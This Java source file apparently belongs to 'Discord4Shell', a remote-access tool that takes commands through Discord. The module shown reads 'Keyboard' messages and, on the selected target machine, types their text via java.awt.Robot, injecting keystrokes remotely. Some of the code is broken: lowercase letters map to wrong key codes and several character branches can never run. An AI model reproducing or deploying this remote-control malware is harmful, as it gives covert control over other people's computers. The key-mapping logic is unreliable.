package org.example.commands;

import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

import java.awt.*;
import java.awt.event.KeyEvent;
import java.util.ArrayList;
import java.util.Objects;
import static org.example.Discord4Shell.Discord4Shell.user;
import static org.example.commands.SelectTargetMessage.SelectedTarget;

public class KeyboardMessage extends ListenerAdapter {

    public static String Message = null;
    public static ArrayList<String> message = new ArrayList<>();

    public void onMessageReceived(MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) {
            return;
        }

        if (event.getMessage().getContentRaw().contains("Keyboard")) {
            if(Objects.equals(SelectedTarget, user)) {
                String[] args = event.getMessage().getContentRaw().split(" ");
                int index = 1;
                while (index < args.length) {
                    message.add(args[index]);
                    index++;
                }
                Message = String.join(" ", message);
                message.clear();
                int real = 0;
                while (real < Message.length()) {
                    char character = Message.charAt(real);
                    try {
                        Robot robot = new Robot();
                        if (Character.isLetterOrDigit(character)) {
                            if (Character.isUpperCase(character)) {
                                robot.keyPress(KeyEvent.VK_SHIFT);
                                robot.keyPress(character);
                                robot.keyRelease(character);
                                robot.keyRelease(KeyEvent.VK_SHIFT);
                            }
                            else {
                                robot.keyPress(character);
                                robot.keyRelease(character);
                            }
                        }
                        else if (character == '!') {
                            robot.keyPress(KeyEvent.VK_SHIFT);
                            robot.keyPress(KeyEvent.VK_1);
                            robot.keyRelease(KeyEvent.VK_1);
                            robot.keyRelease(KeyEvent.VK_SHIFT);
                        }
                        else if (character == '@') {
                            robot.keyPress(KeyEvent.VK_SHIFT);
                            robot.keyPress(KeyEvent.VK_2);
                            robot.keyRelease(KeyEvent.VK_2);
                            robot.keyRelease(KeyEvent.VK_SHIFT);
                        }
                        else if (character == '#') {
                            robot.keyPress(KeyEvent.VK_SHIFT);
                            robot.keyPress(KeyEvent.VK_3);
                            robot.keyRelease(KeyEvent.VK_3);
                            robot.keyRelease(KeyEvent.VK_SHIFT);
                        }
                        else if (character == '$') {
                            robot.keyPress(KeyEvent.VK_SHIFT);
                            robot.keyPress(KeyEvent.VK_4);
                            robot.keyRelease(KeyEvent.VK_4);
                            robot.keyRelease(KeyEvent.VK_SHIFT);
                        }
                        else if (character == '%') {
                            robot.keyPress(KeyEvent.VK_SHIFT);
                            robot.keyPress(KeyEvent.VK_5);
                            robot.keyRelease(KeyEvent.VK_5);
                            robot.keyRelease(KeyEvent.VK_SHIFT);
                        }
                        else if (character == '^') {
                            robot.keyPress(KeyEvent.VK_SHIFT);
                            robot.keyPress(KeyEvent.VK_6);
                            robot.keyRelease(KeyEvent.VK_6);
                            robot.keyRelease(KeyEvent.VK_SHIFT);
                        }
                        else if (character == '&') {
                            robot.keyPress(KeyEvent.VK_SHIFT);
                            robot.keyPress(KeyEvent.VK_7);
                            robot.keyRelease(KeyEvent.VK_7);
                            robot.keyRelease(KeyEvent.VK_SHIFT);
                        }
                        else if (character == '*') {
                            robot.keyPress(KeyEvent.VK_SHIFT);
                            robot.keyPress(KeyEvent.VK_8);
                            robot.keyRelease(KeyEvent.VK_8);
                            robot.keyRelease(KeyEvent.VK_SHIFT);
                        }
                        else if (character == '(') {
                            robot.keyPress(KeyEvent.VK_SHIFT);
                            robot.keyPress(KeyEvent.VK_9);
                            robot.keyRelease(KeyEvent.VK_9);
                            robot.keyRelease(KeyEvent.VK_SHIFT);
                        }
                        else if (character == ')') {
                            robot.keyPress(KeyEvent.VK_SHIFT);
                            robot.keyPress(KeyEvent.VK_0);
                            robot.keyRelease(KeyEvent.VK_0);
                            robot.keyRelease(KeyEvent.VK_SHIFT);
                        }
                        else if (character == ' ') {
                            robot.keyPress(KeyEvent.VK_SPACE);
                            robot.keyRelease(KeyEvent.VK_SPACE);
                        }
                        else if (character == '.') {
                            robot.keyPress(KeyEvent.VK_PERIOD);
                            robot.keyRelease(KeyEvent.VK_PERIOD);
                        }
                        else if (character == ',') {
                            robot.keyPress(KeyEvent.VK_COMMA);
                            robot.keyRelease(KeyEvent.VK_COMMA);
                        }
                        else if (character == '/') {
                            robot.keyPress(KeyEvent.VK_SLASH);
                            robot.keyRelease(KeyEvent.VK_SLASH);
                        }
                        else if (character == '\\') {
                            robot.keyPress(KeyEvent.VK_BACK_SLASH);
                            robot.keyRelease(KeyEvent.VK_BACK_SLASH);
                        }
                        else if (character == ';') {
                            robot.keyPress(KeyEvent.VK_SEMICOLON);
                            robot.keyRelease(KeyEvent.VK_SEMICOLON);
                        }
                        else if (character == '\'') {
                            robot.keyPress(KeyEvent.VK_QUOTE);
                            robot.keyRelease(KeyEvent.VK_QUOTE);
                        }
                        else if (character == '[') {
                            robot.keyPress(KeyEvent.VK_OPEN_BRACKET);
                            robot.keyRelease(KeyEvent.VK_OPEN_BRACKET);
                        }
                        else if (character == ']') {
                            robot.keyPress(KeyEvent.VK_CLOSE_BRACKET);
                            robot.keyRelease(KeyEvent.VK_CLOSE_BRACKET);
                        }
                        else if (character == '-') {
                            robot.keyPress(KeyEvent.VK_MINUS);
                            robot.keyRelease(KeyEvent.VK_MINUS);
                        }
                        else if (character == '=') {
                            robot.keyPress(KeyEvent.VK_EQUALS);
                            robot.keyRelease(KeyEvent.VK_EQUALS);
                        }
                        else if (character == '`') {
                            robot.keyPress(KeyEvent.VK_BACK_QUOTE);
                            robot.keyRelease(KeyEvent.VK_BACK_QUOTE);
                        }
                        else if (character == '!') {
                            robot.keyPress(KeyEvent.VK_EXCLAMATION_MARK);
                            robot.keyRelease(KeyEvent.VK_EXCLAMATION_MARK);
                        }

                        else if (character == '$') {
                            robot.keyPress(KeyEvent.VK_DOLLAR);
                            robot.keyRelease(KeyEvent.VK_DOLLAR);
                        }
                        else if (character == '^') {
                            robot.keyPress(KeyEvent.VK_CIRCUMFLEX);
                            robot.keyRelease(KeyEvent.VK_CIRCUMFLEX);
                        }
                        else if (character == '&') {
                            robot.keyPress(KeyEvent.VK_AMPERSAND);
                            robot.keyRelease(KeyEvent.VK_AMPERSAND);
                        }
                        else if (character == '*') {
                            robot.keyPress(KeyEvent.VK_ASTERISK);
                            robot.keyRelease(KeyEvent.VK_ASTERISK);
                        }
                        else if (character == '(') {
                            robot.keyPress(KeyEvent.VK_LEFT_PARENTHESIS);
                            robot.keyRelease(KeyEvent.VK_LEFT_PARENTHESIS);
                        }
                        else if (character == ')') {
                            robot.keyPress(KeyEvent.VK_RIGHT_PARENTHESIS);
                            robot.keyRelease(KeyEvent.VK_RIGHT_PARENTHESIS);
                        }
                        else if (character == '_') {
                            robot.keyPress(KeyEvent.VK_UNDERSCORE);
                            robot.keyRelease(KeyEvent.VK_UNDERSCORE);
                        }
                        else if (character == '+') {
                            robot.keyPress(KeyEvent.VK_PLUS);
                            robot.keyRelease(KeyEvent.VK_PLUS);
                        }
                        else if (character == '{') {
                            robot.keyPress(KeyEvent.VK_OPEN_BRACKET);
                            robot.keyRelease(KeyEvent.VK_OPEN_BRACKET);
                        }
                        else if (character == '}') {
                            robot.keyPress(KeyEvent.VK_CLOSE_BRACKET);
                            robot.keyRelease(KeyEvent.VK_CLOSE_BRACKET);
                        }
                        else if (character == ':') {
                            robot.keyPress(KeyEvent.VK_COLON);
                            robot.keyRelease(KeyEvent.VK_COLON);
                        }
                        else if (character == '"') {
                            robot.keyPress(KeyEvent.VK_QUOTEDBL);
                            robot.keyRelease(KeyEvent.VK_QUOTEDBL);
                        }
                        else {
                            event.getChannel().sendMessage("Error: Invalid Character").queue();
                        }
                    } catch (AWTException e) {
                        e.printStackTrace();
                    }
                    real++;
                    }
                }
            }
        }
    }

